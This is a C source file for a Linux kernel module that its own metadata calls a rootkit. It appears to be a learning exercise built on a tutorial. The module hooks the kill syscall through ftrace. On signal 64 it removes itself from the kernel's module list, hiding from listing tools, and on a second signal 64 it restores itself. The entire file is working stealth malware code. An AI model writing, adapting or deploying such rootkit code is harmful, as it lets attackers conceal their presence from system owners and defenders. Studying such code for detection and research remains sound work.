#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/module.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alvin (guided with XCellerator");
MODULE_DESCRIPTION("Rootkit hiding itself");
MODULE_VERSION("0.01");

static int hidden = 0;
static struct list_head *hiding_spot;

#ifdef MODULE
extern struct module __this_module;
#define THIS_MODULE (&__this_module)
#else
#define THIS_MODULE ((struct module*)0)
#endif

void hide_me(void){
	hiding_spot = THIS_MODULE->list.prev;
	list_del(&(THIS_MODULE->list));
	printk(KERN_INFO "Going into hiding...\n");
}

void show_me(void){
	list_add(&(THIS_MODULE->list),hiding_spot);
	printk(KERN_INFO "Coming out of hiding...\n");
}

static asmlinkage long (*orig_kill)(const struct pt_regs *regs);

asmlinkage int hook_kill(const struct pt_regs *regs){
	int sig = regs->si;
	if(sig == 64 && !hidden){
		hide_me();
		hidden = 1;
		return 0;
	}
	else if(sig == 64 && hidden){
		show_me();
		hidden = 0;
		return 0;
	}
	return orig_kill(regs);
}

//The hooking structure: for every syscall we want to hijack,
//we put in one more entry into this ftrace_hook struct array:
//HOOK([string name of syscall],literally just the method name 
//of the hijacked func, (static)address of space to put original func)

static struct ftrace_hook hooks[] = {
	HOOK("sys_kill", hook_kill, &orig_kill),
};


int __init my_init(void){
	
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err){
		return err;
	}
	
	printk(KERN_INFO "hiding test loaded!\n");
	return 0;
}

void __exit my_exit(void){
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "exiting hiding test!\n");
}

module_init(my_init);
module_exit(my_exit);